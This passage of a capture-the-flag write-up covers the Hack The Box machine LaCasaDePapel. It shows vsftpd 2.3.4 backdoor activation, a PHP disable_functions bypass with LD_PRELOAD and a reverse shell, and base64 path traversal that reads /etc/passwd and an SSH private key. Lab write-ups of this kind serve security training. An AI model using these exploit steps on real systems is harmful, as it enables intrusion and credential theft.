<li><a href="#getting-root-by-exploiting-memcached">Getting root by exploiting memcached</a></li>
<li><a href="#alternative-long-path-gettings-berlin-s-key-via-the-web">Alternative long path: Gettings berlin&rsquo;s key via the web</a></li>
 
      
        <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
      </ul>
    </li>
   </ul>
  
   
  <ul class="nav nav-pills">
      <li><a class="p-logo" href="https://alamot.github.io/"><i class="fa fa-home" aria-hidden="true"></i> <span class="hidden768" lang="en">The Portal of Knowledge</span><span class="hidden768" lang="el">Η Πύλη της Γνώσης</span></a></li>
  </ul>
  
  <ul class="nav nav-pills pull-right topmargin7"> 
    <li id="lang-selector" role="presentation" class="dropdown">
      <a id="lang-index" class="dropdown-toggle btn-primary" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Language <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu">
        <li><a id="en" href="#">English</a></li>
        <li><a id="el" href="#">Ελληνικά</a></li>
      </ul>
    </li>  
  </ul>
</div>
</nav>
<script>
langtext = "English";
language = localStorage.getItem('language');
if (language) {
  document.getElementById('mainbody').setAttribute('class', language);
  document.getElementById('mainbody').setAttribute('lang', language);
  if (language == 'el') { langtext="Ελληνικά"; }
  document.getElementById("lang-index").innerHTML=langtext+' <i class="fa fa-caret-down" aria-hidden="true"></i>';
}
</script>




<div class="container-fluid">
  <div class="row">
    <div class="col-md-12">
      <article class="single centered">
        <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
        <div class="body">
            <header lang="en"><h1 id="title" class="title">LaCasaDePapel (Hack The Box) write-up</h1></header>
            <header lang="el"><h1 class="title">Ανάλυση του LaCasaDePapel (Hack The Box)</h1></header>
            <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
            <time lang="en" class="topmargin7">27 Jul 2019</time>
            <time lang="el" class="topmargin7">27 Ιουλ 2019</time>
            &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
            
              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
                <span lang="en">Cybersecurity</span>
                <span lang="el">Κυβερνοασφάλεια</span>
              </a>
            
            &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
                <span lang="en">hackthebox</span>
                <span lang="el">hackthebox</span>
                </a>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/linux'>
                <span lang="en">linux</span>
                <span lang="el">linux</span>
                </a>
            
         
         <aside>
          <section>
            <header lang="en"><h2>Contents</h2></header>
            <header lang="el"><h2>Περιεχόμενα</h2></header>
            <div><nav id="TableOfContents">
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
</ul></li>
<li><a href="#exploiting-vsftpd-2-3-4">Exploiting vsftpd 2.3.4</a></li>
<li><a href="#getting-dali-shell-by-escaping-php-restrictions">Getting dali shell by escaping PHP restrictions</a></li>
<li><a href="#getting-professor-shell-by-exploiting-port-8000">Getting professor shell by exploiting port 8000</a></li>
<li><a href="#getting-root-by-exploiting-memcached">Getting root by exploiting memcached</a></li>
<li><a href="#alternative-long-path-gettings-berlin-s-key-via-the-web">Alternative long path: Gettings berlin&rsquo;s key via the web</a></li>
</ul>
</nav></div>
          </section>
         </aside>
        
        

<h1 id="introduction">Introduction</h1>

<p>LaCasaDePapel is an easy difficulty Linux box, which is running a backdoored vsftpd server. The backdoored port is running a PHP shell with disabled_functions (that can be bypassed). The HTTPS page is vulnerable to LFI, leading to exposure of SSH keys. A configuration file can be hijacked to gain code execution as root.</p>

<p><a href="https://www.hackthebox.com/machines/lacasadepapel" target="_blank">https://www.hackthebox.com/machines/lacasadepapel</a></p>

<h1 id="enumeration">Enumeration</h1>

<h2 id="port-scanning">Port scanning</h2>

<p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py</a>)</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo htbscan.py 10.10.10.131
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p1-65535,U:1-65535 --max-rate 500 --interactive 10.10.10.131
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-26 19:11:26 GMT
</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [131070 ports/host]
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.131                                    
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 443/tcp on 10.10.10.131                                   
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 22/tcp on 10.10.10.131                                    
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 22/tcp on 10.10.10.131                                    
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 21/tcp on 10.10.10.131                                    
</span></span></span><span class="line"><span class="cl"><span class="go">                                                                             
</span></span></span><span class="line"><span class="cl"><span class="go">Running command: sudo nmap -A -p21,22,80,443 10.10.10.131
</span></span></span><span class="line"><span class="cl"><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 22:19 EEST
</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for lacasadepapel.htb (10.10.10.131)
</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.16s latency).
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT    STATE SERVICE  VERSION
</span></span></span><span class="line"><span class="cl"><span class="go">21/tcp  open  ftp      vsftpd 2.3.4
</span></span></span><span class="line"><span class="cl"><span class="go">22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
</span></span></span><span class="line"><span class="cl"><span class="go">| ssh-hostkey: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
</span></span></span><span class="line"><span class="cl"><span class="go">|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
</span></span></span><span class="line"><span class="cl"><span class="go">|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp  open  http     Node.js (Express middleware)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: La Casa De Papel
</span></span></span><span class="line"><span class="cl"><span class="go">443/tcp open  ssl/http Node.js Express framework
</span></span></span><span class="line"><span class="cl"><span class="go">| http-auth: 
</span></span></span><span class="line"><span class="cl"><span class="go">| HTTP/1.1 401 Unauthorized\x0D
</span></span></span><span class="line"><span class="cl"><span class="go">|_  Server returned status 401 but no WWW-Authenticate header.
</span></span></span><span class="line"><span class="cl"><span class="go">| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
</span></span></span><span class="line"><span class="cl"><span class="go">| Not valid before: 2019-01-27T08:35:30
</span></span></span><span class="line"><span class="cl"><span class="go">|_Not valid after:  2029-01-24T08:35:30
</span></span></span><span class="line"><span class="cl"><span class="go">| tls-alpn: 
</span></span></span><span class="line"><span class="cl"><span class="go">|_  http/1.1
</span></span></span><span class="line"><span class="cl"><span class="go">| tls-nextprotoneg: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   http/1.1
</span></span></span><span class="line"><span class="cl"><span class="go">|_  http/1.0
</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%)
</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
</span></span></span><span class="line"><span class="cl"><span class="go">Network Distance: 2 hops
</span></span></span><span class="line"><span class="cl"><span class="go">Service Info: OS: Unix
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">TRACEROUTE (using port 443/tcp)
</span></span></span><span class="line"><span class="cl"><span class="go">HOP RTT      ADDRESS
</span></span></span><span class="line"><span class="cl"><span class="go">1   65.20 ms 10.10.12.1
</span></span></span><span class="line"><span class="cl"><span class="go">2   65.21 ms lacasadepapel.htb (10.10.10.131)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class="line"><span class="cl"><span class="go">Nmap done: 1 IP address (1 host up) scanned in 65.85 seconds
</span></span></span></code></pre></div></div>

<h1 id="exploiting-vsftpd-2-3-4">Exploiting vsftpd 2.3.4</h1>

<p>We observe that the machine runs vsftpd on port 21. Version 2.3.4 of vsftpd is very infamous. Read this: <a href="https://en.wikipedia.org/wiki/Vsftpd#History" target="_blank">https://en.wikipedia.org/wiki/Vsftpd#History</a></p>

<p>In July 2011, it was discovered that vsftpd version 2.3.4 downloadable from the master site had been compromised. Users logging into a compromised vsftpd-2.3.4 server may issue a &ldquo;:)&rdquo; smileyface as the username -or any username ending with a smiley &ldquo;:)&ldquo;-  and gain a command shell on port 6200. This was not an issue of a security hole in vsftpd, instead, an unknown attacker had uploaded a different version of vsftpd which contained a backdoor.</p>

<p>Let&rsquo;s search exploits for this:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> searchsploit vsftpd 2.3.4 -w
</span></span><span class="line"><span class="cl"><span class="go">|--------------------------------------------------------| 
</span></span></span><span class="line"><span class="cl"><span class="go">| Exploit Title                                          | 
</span></span></span><span class="line"><span class="cl"><span class="go">|--------------------------------------------------------| 
</span></span></span><span class="line"><span class="cl"><span class="go">| vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | 
</span></span></span><span class="line"><span class="cl"><span class="go">|--------------------------------------------------------| 
</span></span></span></code></pre></div></div></p>

<p>Well, no need for metasploit. We can use telnet or nc to activate the backdoor:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nc -v 10.10.10.131 <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Connection to 10.10.10.131 21 port [tcp/ftp] succeeded!
</span></span></span><span class="line"><span class="cl"><span class="go">220 (vsFTPd 2.3.4)
</span></span></span><span class="line"><span class="cl"><span class="go">USER whatever:) 
</span></span></span><span class="line"><span class="cl"><span class="go">331 Please specify the password.
</span></span></span><span class="line"><span class="cl"><span class="go">PASS whatever
</span></span></span><span class="line"><span class="cl"><span class="go">^C
</span></span></span></code></pre></div></div></p>

<p>Just as simple as that the backdoor has been activated. Now, let&rsquo;s try to connect to port 6200:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nc 10.10.10.131 <span class="m">6200</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
</span></span></span></code></pre></div></div></p>

<h1 id="getting-dali-shell-by-escaping-php-restrictions">Getting dali shell by escaping PHP restrictions</h1>

<p>Well, a nice twist! It seems we have access to something called &ldquo;Psy Shell&rdquo;. This is a runtime developer console, interactive debugger and REPL for PHP. This means we can execute PHP code. Neat! But wait&hellip; Some very useful PHP functions have been disabled:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Disable Functions: &#34;</span> <span class="o">.</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Disable</span> <span class="nx">Functions</span><span class="o">:</span> <span class="nx">exec</span><span class="p">,</span><span class="nx">passthru</span><span class="p">,</span><span class="nx">shell_exec</span><span class="p">,</span><span class="nx">system</span><span class="p">,</span><span class="nx">proc_open</span><span class="p">,</span><span class="nx">popen</span><span class="p">,</span><span class="nx">curl_exec</span><span class="p">,</span><span class="nx">curl_multi_exec</span><span class="p">,</span><span class="nx">parse_ini_file</span><span class="p">,</span><span class="nx">show_source</span></span></span></code></pre></div></p>

<p>But, as you can imagine, there are many ways to bypass this kind of restrictions. I used a tool called Chankro (<a href="https://github.com/TarlogicSecurity/Chankro" target="_blank">https://github.com/TarlogicSecurity/Chankro</a>). PHP in Linux calls a binary (sendmail) when the mail() function is executed. If we have putenv() allowed, we can set the environment variable &ldquo;LD_PRELOAD&rdquo;, so we can preload an arbitrary shared object. Our shared object will execute our custom payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example. The main idea is this:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;/tmp/chankro.so&#39;</span><span class="p">,</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;base64-encoded chankro.so&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;/tmp/acpid.socket&#39;</span><span class="p">,</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;base64-encoded shell payload&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s1">&#39;CHANKRO=/tmp/acpid.socket&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s1">&#39;LD_PRELOAD=/tmp/chankro.so&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mail</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span></span></span></code></pre></div></p>

<p>In reality, I used python (see my autopwn script) to help us automate the upload of files. Because  the content of chankro.so is too big for an one-liner command, I had to break it in smallers chunks.
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ./autopwn_lacasadepapel.py
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Attempting to trigger backdoor...
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Opening connection to 10.10.10.131 on port 21: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Triggered backdoor
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Opening connection to 10.10.10.131 on port 6200: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60000: Done
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.131 on port 36005
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Switching to interactive mode
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> whoami
</span></span><span class="line"><span class="cl"><span class="go">dali
</span></span></span></code></pre></div></div></p>

<h1 id="getting-professor-shell-by-exploiting-port-8000">Getting professor shell by exploiting port 8000</h1>

<p>Nice! Now we have a normal shell as user &lsquo;dali&rsquo;. Let&rsquo;s enumerate a little:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> netstat -lntup
</span></span><span class="line"><span class="cl"><span class="go">Active Internet connections (only servers)
</span></span></span><span class="line"><span class="cl"><span class="go">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
</span></span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
</span></span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -
</span></span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
</span></span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
</span></span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      -
</span></span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 :::22                   :::*                    LISTEN      -
</span></span></span><span class="line"><span class="cl"><span class="go">udp        0      0 127.0.0.1:11211         0.0.0.0:*                           -
</span></span></span></code></pre></div></div></p>

<p>There are some interesting ports (8000 and 11211) listening only locally. Let&rsquo;s explore 8000 for now:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl http://127.0.0.1:8000
</span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;?path=SEASON-1&#34;&gt;SEASON-1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#34;?path=SEASON-2&#34;&gt;SEASON-2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Select a season&lt;/strong&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> curl http://127.0.0.1:8000?path<span class="o">=</span>SEASON-1
</span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDEuYXZp&#34;&gt;01.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDIuYXZp&#34;&gt;02.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDMuYXZp&#34;&gt;03.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDQuYXZp&#34;&gt;04.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDUuYXZp&#34;&gt;05.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDYuYXZp&#34;&gt;06.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDcuYXZp&#34;&gt;07.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDguYXZp&#34;&gt;08.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMDkuYXZp&#34;&gt;09.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMTAuYXZp&#34;&gt;10.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMTEuYXZp&#34;&gt;11.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMTIuYXZp&#34;&gt;12.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;a href=&#34;/file/U0VBU09OLTEvMTMuYXZp&#34;&gt;13.avi&lt;/a&gt;&lt;/li&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;li&gt;&lt;strong&gt;Donwload a video&lt;/strong&gt;&lt;/li&gt;
</span></span></span></code></pre></div></div></p>

<p>Well, well, what we have here? These filenames in the links seem like base64 encoding. Let&rsquo;s test one:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> U0VBU09OLTEvMDUuYXZp <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl"><span class="go">SEASON-1/05.avi
</span></span></span></code></pre></div></div></p>

<p>Bingo! WHAT IF we encode a path/filename we want to grab to base64 encoding and hit the relevant URL with curl?
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> -ne /etc/passwd <span class="p">|</span> base64
</span></span><span class="line"><span class="cl"><span class="go">L2V0Yy9wYXNzd2Q=
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> curl http://127.0.0.1:8000/file/L2V0Yy9wYXNzd2Q<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="go">&lt;!DOCTYPE html&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;title&gt;Error&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;pre&gt;Error: ENOENT: no such file or directory, open &amp;#39;/home/berlin/downloads//etc/passwd&amp;#39;&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.fs.openSync (fs.js:646:18)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.fs.readFileSync (fs.js:551:33)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /home/berlin/server.js:32:15&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/home/berlin/node_modules/express/lib/router/route.js:137:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/home/berlin/node_modules/express/lib/router/route.js:112:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /home/berlin/node_modules/express/lib/router/index.js:281:22&lt;br&gt; &amp;nbsp; &amp;nbsp;at param (/home/berlin/node_modules/express/lib/router/index.js:354:14)&lt;br&gt; &amp;nbsp; &amp;nbsp;at param (/home/berlin/node_modules/express/lib/router/index.js:365:14)&lt;/pre&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="go">&lt;/html&gt;
</span></span></span></code></pre></div></div></p>

<p>Hmmm&hellip;. We see this &ldquo;/home/berlin/downloads//etc/passwd&rdquo; in the output. Perfect! All we need it&rsquo;s some directory/path traversal:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> -ne ../../../etc/passwd <span class="p">|</span> base64
</span></span><span class="line"><span class="cl"><span class="go">Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> curl http://127.0.0.1:8000/file/Li4vLi4vLi4vZXRjL3Bhc3N3ZA<span class="o">==</span>
</span></span><span class="line"><span class="cl"><span class="go">root:x:0:0:root:/root:/bin/ash
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh
</span></span></span><span class="line"><span class="cl"><span class="go">berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash
</span></span></span><span class="line"><span class="cl"><span class="go">professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
</span></span></span><span class="line"><span class="cl"><span class="go">vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin
</span></span></span><span class="line"><span class="cl"><span class="go">memcached:x:102:102:memcached:/home/memcached:/sbin/nologin
</span></span></span></code></pre></div></div></p>

<p>Yes baby! It worked! Let&rsquo;s grab user.txt:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> -ne ../user.txt <span class="p">|</span> base64
</span></span><span class="line"><span class="cl"><span class="go">Li4vdXNlci50eHQ=
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> curl http://127.0.0.1:8000/file/Li4vdXNlci50eHQ<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="go">4dcbd172****************48d9062d
</span></span></span></code></pre></div></div></p>

<p>We can also grab berlin&rsquo;s key:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> -ne  ../.ssh/id_rsa <span class="p">|</span> base64
</span></span><span class="line"><span class="cl"><span class="go">Li4vLnNzaC9pZF9yc2E=
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> curl http://127.0.0.1:8000/file/Li4vLnNzaC9pZF9yc2E<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class="line"><span class="cl"><span class="go">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span><span class="line"><span class="cl"><span class="go">X3a0iF5JE3kAAAAYYmVybGluQGxhY2FzYWRlcGFwZWwuaHRiAQID
</span></span></span><span class="line"><span class="cl"><span class="go">-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div></div></p>

<p>Here, we reached the point that confused many many people. Many folks were trying to use berlin&rsquo;s private key to connect via ssh as berlin@10.10.10.131. And they were utterly confused why this didn&rsquo;t work but instead one could connect as professor@10.10.10.131.</p>

<p>Let&rsquo;s try to clear things up. A user can produce as many pairs of private-public keys he wants. All those keys are completely useless until they are deployed in a very specific way. For ssh authentication this means we have to put the public key of a pair inside a very specific file i.e. the ~/.ssh/authorized_keys of ANY user. Then we can login as the specific user using the private key of that pair. Moreover for security reasons, nowadays, both the private key and the ~/.ssh/authorized_keys files are required to have strict permissions (chmod 600).</p>

<p>Think the private key as a real key, the public key as a keyhole/lock and the ~/.ssh/authorized_keys as a door. We have to put the keyhole/lock to a door. And our key can unlock only a door that has the respective keyhole/lock.</p>

<p>Now, you tell me that one could expect berlin&rsquo;s key to open berlin&rsquo;s door. Well, you have a point&hellip; but&hellip; no really. In practice, very often, users do produce key pairs in order to connect to some other accounts.</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ssh -i berlin_id_rsa professor@10.10.10.131
</span></span><span class="line"><span class="cl"><span class="go"> _             ____                  ____         ____                  _ 
</span></span></span><span class="line"><span class="cl"><span class="go">| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
